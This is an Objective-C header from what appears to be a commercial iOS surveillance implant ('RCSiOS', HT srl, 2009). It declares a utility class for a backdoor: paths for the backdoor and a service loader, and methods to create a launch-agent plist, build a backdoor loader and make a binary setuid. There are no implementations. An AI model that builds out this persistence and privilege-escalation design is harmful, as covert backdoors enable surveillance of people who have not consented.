/*
 * RCSiOS - Utils
 *
 *
 * Created on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#ifndef __RCSIUtils_h__
#define __RCSIUtils_h__


@interface RCSIUtils : NSObject
{
@private
  NSString *mBackdoorPath;
  NSString *mServiceLoaderPath;
}

- (id)initWithBackdoorPath: (NSString *)aBackdoorPath
             serviceLoader: (NSString *)aServiceLoaderPath;

- (void)dealloc;

- (BOOL)createLaunchAgentPlist: (NSString *)aLabel;

- (BOOL)createBackdoorLoader;

- (BOOL)makeSuidBinary: (NSString *)aBinary;

- (NSString *)mBackdoorPath;
- (void)setBackdoorPath: (NSString *)aValue;

- (NSString *)mServiceLoaderPath;
- (void)setServiceLoaderPath: (NSString *)aValue;

@end

#endif
